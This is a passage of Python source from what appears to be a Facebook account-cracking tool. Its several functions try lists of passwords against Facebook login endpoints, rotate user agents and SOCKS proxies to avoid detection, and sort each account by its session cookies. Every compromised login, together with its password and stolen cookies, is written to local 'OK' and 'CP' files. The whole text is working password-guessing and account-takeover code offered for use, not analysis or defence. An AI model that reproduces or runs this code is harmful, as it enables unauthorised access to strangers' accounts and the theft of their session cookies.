			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=822564807908213&auth_token=f5141da7ab8264fc6ee91760d3580787&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1687406048139%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df29ffec2f374b%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df3a2f181fa9a828%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2d27df595696e%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%2526frame%253Dfe585a07da2204%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=822564807908213&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2d27df595696e%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ff18ff54dfb5fb68%26relation%3Dopener%26frame%3Dfe585a07da2204%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}\n')
				#os.popen('play-audio /sdcard/cp.mp3') 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE MOBILE V2 ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"{U2}RAF-MKZ ⏰ [bold yellow]{ahir} ⏰ [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}[/]  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[/][white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2572246932852997%26cbt%3D1680997745004%26e2e%3D%257B%2522init%2522%253A1680997745004%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pure.indosat.care%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbc5a75ae-2b5b-4472-a65e-f9c2358a25e7%26tp%3Dunspecified%26refsrc%3Ddeprecated%26__req%3D9%26_rdr&cancel_url=fbconnect%3A%2F%2Fcct.com.pure.indosat.care%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': f'{idf} {pw}', 
'prefill_type': 'contact_point',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': True, 
'had_password_prefilled': False, 
'is_smart_lock': False, 
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r{U2}[{P2}☕{U2}] {P2}USER   : {K2}{idf} >> {cektahun(idf)}\n\r{U2}[{P2}☕{U2}] {P2}PASS   : {K2}{pw}\n\r{U2}[{P2}☕{U2}] {P2}UGEN   : {SE}{ua}\n',width=79,title=f'[yellow]AKUN CP',style="#FF7200"))
				os.popen('play-audio /sdcard/cp.mp3') 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				cetak(nel(f'\r{U2}[{P2}☕{U2}] {P2}USER   : {H2}{idf} >> {cektahun(idf)}\n\r{U2}[{P2}☕{U2}] {P2}PASS   : {H2}{pw}\n\r{U2}[{P2}☕{U2}] {P2}COKI   : {SE}{kuki}\n',width=79,title=f'[green]AKUN OK',style="#FF7200"))
				os.popen('play-audio /sdcard/ok.mp3') 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv,awal):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"{U2}RAF-MKZ ⏰ [bold yellow]{ahir} ⏰ [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}[/]  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[/][white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip,deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=2036793259884297&cbt=1685898230661&e2e=%7B%22init%22%3A1685898230661%7D&ies=1&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=ab5787e4-1930-4a43-b083-079caa897f72&scope=openid%2Cpublic_profile%2Cuser_friends%2Cemail&state=%7B%220_auth_logger_id%22%3A%22d43e9f47-9ed1-45ab-b92a-3597ae93a176%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%227pefkbumdvkfet5cqt6k%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.dts.freefireth&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=d43e9f47-9ed1-45ab-b92a-3597ae93a176&tp=unspecified"}
			head2={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=head2,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{U}[{P}☕{U}] {P}USER   : {k}{idf} {P}<=>{tahun(idf)}\n\r{U}[{P}☕{U}] {P}PASS   : {k}{pw}\n\r{U}[{P}☕{U}] {P}UGEN   : {k}{ua}\n') 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{U}[{P}☕{U}] {P}USER   : {h}{idf} {P}<=>{tahun(idf)}\n\r{U}[{P}☕{U}] {P}PASS   : {h}{pw}\n\r{U}[{P}☕{U}] {P}COKI   : {h}{kuki}\n') 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				#cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE FREE]-------------------#
def crackfree(idf,pwv,awal):
	raff=[]
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	usus = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"{SE}{idf} ⏰ [bold yellow]{ahir} ⏰ [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': usus,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}) 
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=1389177071407768&kid_directed_site=0&app_id=1389177071407768&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1389177071407768%26cbt%3D1688866255870%26e2e%3D%257B%2522init%2522%253A1688866255871%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D0daeab6f-0feb-4907-91fb-3ab36f0d9902%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252265fdc98e-6fbe-4e78-bd13-e8e2fc66c8dd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229osr9bpsqoi9cf2hp1s6%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1389177071407768%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D65fdc98e-6fbe-4e78-bd13-e8e2fc66c8dd%26tp%3Dunspecified&cancel_url=fb1389177071407768%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252265fdc98e-6fbe-4e78-bd13-e8e2fc66c8dd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229osr9bpsqoi9cf2hp1s6%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			suhk = par(p.text, "html.parser")
			xxxx = suhk.find("form",{"method":"post"})["action"]
			date = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"email":idf, 
			"next":"https://free.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=1389177071407768&cbt=1688866255870&e2e=%7B%22init%22%3A1688866255871%7D&ies=1&sdk=android-12.3.0&sso=chrome_custom_tab&nonce=0daeab6f-0feb-4907-91fb-3ab36f0d9902&scope=public_profile%2Cemail%2Copenid&state=%7B%220_auth_logger_id%22%3A%2265fdc98e-6fbe-4e78-bd13-e8e2fc66c8dd%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%229osr9bpsqoi9cf2hp1s6%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb1389177071407768%3A%2F%2Fauthorize%2F&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=65fdc98e-6fbe-4e78-bd13-e8e2fc66c8dd&tp=unspecified",
			"pass":pw,
			"login":"submit"
			}
			po = ses.post(f"https://m.facebook.com{xxxx}", data=date,headers={"user-agent": usus,},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}\n')
				os.popen('play-audio /sdcard/cp.mp3') 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
